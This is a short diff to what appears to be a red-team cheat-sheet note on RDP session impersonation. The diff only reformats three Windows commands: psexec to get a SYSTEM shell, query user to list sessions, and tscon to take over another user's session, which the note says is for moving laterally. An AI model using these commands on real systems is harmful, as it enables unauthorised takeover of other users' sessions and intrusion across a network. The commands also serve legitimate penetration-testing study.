@@ -1,9 +1,9 @@
 # RDP Session Impersonation
 
- - psexec -s -i cmd
+    psexec -s -i cmd
 
- - query user
+    query user
 
- - cmd /k tscon ID /dest:console
+    cmd /k tscon ID /dest:console
 
 ### Now we can move laterally via RDP
